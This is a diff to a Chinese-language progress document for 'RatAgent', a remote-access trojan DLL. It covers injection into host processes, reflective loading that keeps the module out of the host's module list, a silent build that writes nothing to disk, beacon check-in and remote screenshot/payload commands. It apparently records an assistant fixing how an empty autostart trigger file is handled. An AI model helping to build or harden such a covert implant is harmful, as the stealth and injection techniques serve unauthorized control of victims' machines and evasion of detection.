@@ -31,7 +31,7 @@
 | **Agent DLL 形态**（rundll32 / LoadLibrary / 注入） | ✅ | §8.4（导出表/依赖/三种宿主） |
 | **可停止**（进程内标志 + 跨进程命名事件） | ✅ | §8.4（rundll32 ↔ 另一进程 Stop；宿主存活） |
 | **`-tcp` 长连接模式可命令行切换**（不必改 `main()`） | ✅ | §8.4（sessions 显示真实 IP:PORT） |
-| **加载即自启**（有 `autostart.args` 用文件参数，无则内置默认配置） | ✅ | §8.4 / §8.5 |
+| **加载即自启**（`autostart.args` 存在且内容非空用文件参数；不存在或为空则内置默认配置） | ✅ | §8.5 / §9.9 |
 | **反射加载（外部 RfUdrl）**：cpl link 出 PIC → runpic 宿主 → 手动映射上线/远控/优雅停止 | ✅ | §8.5（宿主模块表无 RatAgent.dll） |
 | **静默构建**（`RAT_AGENT_DEBUG=0`：无诊断输出、磁盘零写入） | ✅ | §8.6（诊断串 6/6 → 0/6） |
 | 本地 git 版本管理（VS 专用 .gitignore） | ✅ | 见 §4 |
@@ -133,7 +133,8 @@ screenshot [id] <file> / screen [id] [fps] [quality] [scale] / stop / payload <f
     `Stop` 可在**另一个进程**里按 id 文件或 32 位 hex 触发
   - 注入：**不要**把远程线程入口指向导出（目标的 CFG/XFG 会给 `0xC0000409`）；
     用"远程 `LoadLibraryW` → 加载即自启"。自启是 DllMain 之后延迟 300ms 的线程：
-    有 `autostart.args` 用文件参数，**没有就用内置默认配置**（副作用见 §8.5 实测影响）
+    `autostart.args` **存在且内容非空**才用文件参数，**文件不存在或内容为空**都用内置默认配置
+    （副作用见 §8.5 实测影响；空文件的处理见 §9.9）
   - DLL 默认落盘 `%LOCALAPPDATA%\RatAgent\`（`agent.id`/`agent.log`），可用 `id=`/`log=` 覆盖；
     静态 CRT `/MT`，`dumpbin /dependents` 只有系统 DLL
   - 手动映射须先调用入口点（`DLL_PROCESS_ATTACH`）初始化 CRT，再调导出
@@ -543,3 +544,37 @@ README、DESIGN、`client/core/agent_debug.h` 的构建示例、`agent_dll.cpp` 
 - `python scripts/check_projects.py` → **ALL PASS**（6 工程 × 5 项 + 
   `.filters` 同步性 + 3 个目录无游离文件）；
 - `MSBuild client\agents.sln -p:Configuration=Release -p:Platform=x64` → **exit=0**（6 工程全部产出）。
+
+### 9.9 自启动触发器：空文件 = 不存在 = 未触发（✅ 完成）
+
+**起因**（用户提问）：`agent_dll.cpp` 的 `autostart_proc` 里写着
+`start_from_args(args.empty() ? nullptr : args.c_str())`，看着像"没有参数就不启动"。
+
+**先澄清**：不会。`start_from_args()` 先 `fill_dll_defaults(a)` 填好默认值，
+`if (args && *args)` 只**决定要不要解析参数串**——跳过它之后照样执行 `agent_start(a, err)`。
+所以"无参数"= 用内置默认配置启动，这正是设计意图。
+
+**但顺着查出语义不一致**：`agent_autostart_requested()` 只要**成功读到**文件就返回 true，
+于是**空文件**会被当成"有触发"（日志打 `autostart (trigger)`），实际又按默认配置启动——
+**日志与行为不符**，排查时会误导。
+
+**改动**（按用户要求：空文件与文件不存在都走默认配置）
+
+- `agent_autostart_requested()`：读到的内容去掉首尾空白后为空 → **跳过该候选、继续探测**；
+  所有候选都没有非空内容才返回 false。文件不存在 / 读失败同样按"未触发"处理。
+  空文件被跳过时打一行日志点明原因：
+  `[*] autostart: <path> is empty -> treated as no trigger (use default config)`（ASCII，便于 grep）。
+- `autostart_proc()`：触发分支补上实际参数 `args="…"`；删掉无意义的 `args.clear()`。
+- 文档/注释同步：`agent_runtime.h`（权威说明）、`agent_dll.cpp` 文件头、README、DESIGN、
+  模板 README、PROGRESS §2。
+
+**实测**
+- `e2e_rdll.py` 新增 **P3 阶段（空触发器文件）**：断言"仍走默认配置 / 日志点明原因 /
+  默认 id 落盘 / 默认 beacon 上线" → **ALL PASS**；
+- 同一轮里三条路径的参数来源可区分：P1（触发器带 `-s 2`）→ `sleeptime=2s`；
+  P2/P3（无文件 / 空文件）→ `sleeptime=5s`（内置默认）；
+- 五个套件全绿（`e2e_modules` / `e2e_template` / `e2e_screen` / `e2e_rdll` / `e2e_quiet`）。
+
+**顺带说明（本次未改）**：触发器文件里的参数**解析失败**时（例如 `-tpcc` 拼错），
+`start_from_args` 返回 0、自启动**静默不启动**（只在日志留一行 `bad args`）。这是
+"宁可不上线，也不带着错误配置上线"的取舍；若要改成"退回默认配置并告警"，是几行的事。
